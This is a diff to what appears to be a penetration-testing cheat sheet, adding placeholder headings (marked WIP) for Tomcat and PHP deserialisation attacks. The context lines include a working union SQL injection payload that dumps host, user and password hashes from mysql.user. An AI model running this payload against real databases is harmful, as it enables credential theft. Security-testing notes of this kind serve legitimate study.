@@ -311,6 +311,13 @@ Show hostname, user, hashed password of a database from union SQLi:
 php?xxx=9999999 union select 1,(select group_concat(host,user,password) FROM mysql.user),3,4,5,6,7
 ```
 
+## Serilisation/Deserialisation Exploit
+
+### Tomcat Apache Deserialisation attack (CVE 2020-9484) with ```ysoserial``` to generate payload
+WIP
+
+### PHP Deserialisation attack
+WIP
 
 ## Post Exploitation
 Check for current running processes:
